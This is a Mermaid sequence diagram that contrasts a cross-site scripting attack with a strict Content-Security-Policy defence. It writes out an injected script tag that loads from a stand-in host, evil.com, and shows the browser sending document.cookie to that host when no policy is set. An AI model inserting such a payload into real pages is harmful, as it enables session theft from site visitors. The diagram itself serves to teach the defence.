sequenceDiagram
    autonumber
    actor User as Victim Browser
    participant App as Web Application
    actor Hacker as Attacker Server

    User->>App: Visits page containing stored/reflected payload: <script src='evil.com/steal.js'></script>
    App-->>User: Returns HTML containing the script tag
    
    alt Case 1: No Content Security Policy (Vulnerable)
        Note over User: Browser executes script blindly
        User->>Hacker: Sends document.cookie to evil.com/steal.js
    else Case 2: Strict CSP Enabled (Secure)
        Note over User: Browser checks Response Header:<br>Content-Security-Policy: default-src 'self'
        Note over User: Blocks connection to "evil.com" (Not in allowlist)
        User--xHacker: Script execution blocked. Attack stopped.
    end